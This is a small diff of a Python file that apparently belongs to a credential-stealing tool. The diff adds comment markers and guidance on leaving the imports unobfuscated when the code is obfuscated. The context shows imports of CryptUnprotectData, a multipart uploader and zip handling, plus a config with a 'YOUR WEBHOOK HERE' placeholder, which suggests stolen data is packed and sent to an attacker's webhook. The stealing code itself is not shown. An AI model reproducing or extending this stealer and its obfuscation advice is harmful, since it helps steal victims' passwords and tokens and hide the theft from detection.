@@ -1,4 +1,5 @@
-#imports - when you are obfuscating your code you must leave imports part of code unobfuscated
+#imports - when you are obfuscating your code you must leave imports part of code unobfuscated (imports part marked with slashes)
+#/////////////////////////////////////////////////////////////////////////////////////////////
 import sys
 import os
 import base64
@@ -21,7 +22,7 @@ from multiprocessing import cpu_count
 from zipfile import ZIP_DEFLATED, ZipFile
 from win32crypt import CryptUnprotectData
 from requests_toolbelt.multipart.encoder import MultipartEncoder
-
+#////////////////////////////////////////////////////////////////////////////////////////////
 
 __CONFIG__ = {
     "webhook": "YOUR WEBHOOK HERE",
